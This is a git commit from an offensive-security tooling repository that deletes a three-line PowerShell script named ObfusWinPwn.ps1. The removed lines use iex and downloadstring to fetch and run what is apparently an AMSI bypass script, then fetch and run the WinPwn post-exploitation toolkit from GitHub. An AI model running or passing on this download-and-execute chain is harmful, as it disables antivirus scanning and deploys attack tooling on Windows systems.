d186ecd7ccc3037ba7533c5a12416bc3f2e63030
S3cur3Th1sSh1t <27858067+S3cur3Th1sSh1t@users.noreply.github.com>
2021-07-21 07:35:02 +0200

    Delete ObfusWinPwn.ps1

--- ObfusWinPwn.ps1
+++
@@ -1,3 +0,0 @@
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/amsicustom.ps1')
-iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1')
-WinPwn
